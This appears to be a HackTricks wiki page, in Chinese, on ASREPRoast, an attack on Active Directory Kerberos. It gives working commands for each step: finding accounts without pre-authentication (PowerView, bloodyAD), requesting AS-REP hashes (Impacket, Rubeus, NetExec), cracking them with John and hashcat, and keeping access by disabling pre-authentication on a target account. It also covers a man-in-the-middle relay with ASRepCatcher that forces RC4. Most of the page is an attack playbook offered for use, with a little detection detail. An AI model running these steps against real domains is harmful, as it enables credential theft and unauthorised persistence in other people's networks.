# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast 是一种安全攻击，利用缺少 **Kerberos pre-authentication required 属性**的用户。基本上，此漏洞允许攻击者在不需要用户密码的情况下，向域控制器（DC）请求对某个用户进行身份验证。随后，DC 会返回一条使用用户密码派生密钥加密的消息，攻击者可以尝试在离线环境中对其进行破解，以获取用户密码。

此攻击的主要要求包括：

- **缺少 Kerberos pre-authentication**：目标用户未启用此安全功能。
- **连接到域控制器（DC）**：攻击者需要访问 DC，以发送请求并接收加密消息。
- **可选的域账户**：拥有域账户后，攻击者可以通过 LDAP 查询更高效地识别存在漏洞的用户。没有此类账户时，攻击者必须猜测用户名。

#### 枚举存在漏洞的用户（需要域凭据）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Request AS_REP 消息
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus 默认请求 **RC4**，因此 Event ID **4768** 通常显示 **preauth type 0** 和 **ticket encryption type 0x17**。如果添加 **`/aes`**（或目标已禁用 RC4），则应改为 **AES etypes**。<sup>[[2]](#references)</sup>

#### 快速单行命令（Linux）

- 先枚举潜在目标（例如从泄露的构建路径中获取），使用 Kerberos userenum：`kerbrute userenum users.txt -d domain --dc dc.domain`
- 使用 NetExec，在没有有效凭据的情况下对整个用户名列表执行 roast：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- 如果你确实拥有凭据，让 NetExec 查询 LDAP，并为你请求每个可进行 roast 的账户：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 如果输出以 **`$krb5asrep$23$`** 开头，则使用 Hashcat **`-m 18200`** 破解。如果以 **`$krb5asrep$17$`** 或 **`$krb5asrep$18$`** 开头，则优先使用 John **`--format=krb5asrep`**。<sup>[[1]](#references)[[2]](#references)</sup>

### 破解

不要假设每个 AS-REP roast 都是 RC4。现代工具可能根据请求或协商的 enctype 返回 **RC4**（`$krb5asrep$23$`）或 **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）。**`hashcat -m 18200`** 用于 **etype 23**，而 **John** 可直接处理 **17/18/23** 的 `krb5asrep`。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### 持久化

对于你拥有 **GenericAll** 权限（或拥有写入属性权限）的用户，强制其不要求 **preauth**：
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## 无凭据进行 ASREProast

攻击者可以利用中间人位置，在 AS-REP 数据包经过网络时将其捕获，而无需依赖 Kerberos pre-authentication 被禁用。因此，它适用于 VLAN 上的所有用户。\
如果你想了解相关的无凭据技巧，即从 no-preauth principal 返回 **service ticket** 而不是 **TGT**，请参阅 [Kerberoast](kerberoast.md)。

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 可以实现这一点。从攻击角度来看，`relay` 模式更有趣，因为当客户端仍然宣告 **etype 23** 时，它可以强制使用 **RC4**；`listen` 模式则保持被动，只捕获客户端/DC 协商出的内容。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考资料

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
